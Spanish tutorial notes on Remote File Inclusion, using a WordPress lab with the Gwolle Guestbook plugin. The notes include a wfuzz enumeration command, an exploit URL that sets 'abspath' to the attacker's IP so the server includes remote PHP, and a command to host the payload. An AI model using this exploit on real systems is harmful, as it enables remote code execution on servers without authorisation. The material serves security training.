# Remote File Inclusión (RFI)

Tags: #RFI #OWASP #Explotacion

La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir** **archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.

En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.

Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad:

- **DVWP**: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwolle Guestbook**‘ de WordPress:

- **Gwolle Guestbook**: [https://es.wordpress.org/plugins/gwolle-gb/](https://es.wordpress.org/plugins/gwolle-gb/)

## Código

Para descubrir si tiene el Plugin de **gwolle-gb**

```bash 
❯ wfuzz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt http://❮IP❯/FUZZ

# hc -> HideCode 404
# c -> Formato colorido
# w -> Ruta del diccionario
# FUZZ -> Donde va a insertar las palabras el diccionario
# t -> Lanzar tareas en paralelo al mismo tiempo
```

**Nota**: El PHP de la victima debe de tener '**allow_url_include = 'ON'**', de lo contrario no va a funcionar
Podemos explotar la vulnerabilidad agregando desde '/wp-content/' esto a la url de la pagina web:

```bash 
❯ http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.68.11/ # Colocamos nuestra IP y lo que hara ese comando es intentar cargar un archivo 'GET /wp-load.php HTTP/1.0'
```

Debemos de tener activo un servidor http en nuestra maquina de atacante

```bash 
❯ python3 -m http.server 80 # Nos montamos un servidor http 80
```

